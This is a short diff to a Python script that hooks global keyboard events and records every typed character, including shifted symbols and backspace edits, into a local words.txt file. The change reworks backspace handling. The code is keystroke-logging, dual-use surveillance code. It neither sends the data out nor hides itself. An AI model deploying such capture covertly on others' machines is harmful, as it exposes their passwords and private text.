@@ -27,11 +27,8 @@ def press_event(event: keyboard.KeyboardEvent) -> None:
     if event.name == "shift":
         is_shift = True
     elif event.name == "backspace":
-        if os.path.exists("words.txt"):
-            with open("words.txt", "r") as file:
-                content = file.read()[:-1]
-            with open("words.txt", "w") as file:
-                file.write(content)
+        pass
+
     elif is_shift and  event.name is not None and event.name.isdigit():
         with open("words.txt", "a") as file:
             file.write(get_shift_symbol(int(event.name)))
@@ -45,7 +42,14 @@ def release_event(event: keyboard.KeyboardEvent) -> None:
     if event.name in IGNORED_KEYS:
         return
     elif event.name == "backspace":
-        pass
+        try:
+            with open("words.txt", "rb+") as file:
+                file.seek(0, os.SEEK_END)
+                pos = file.tell()
+                if pos > 0:
+                    file.truncate(pos - 1)
+        except FileNotFoundError:
+            pass
     elif event.name == "shift":
         is_shift = False
     elif event.name is not None and event.name.isdigit():
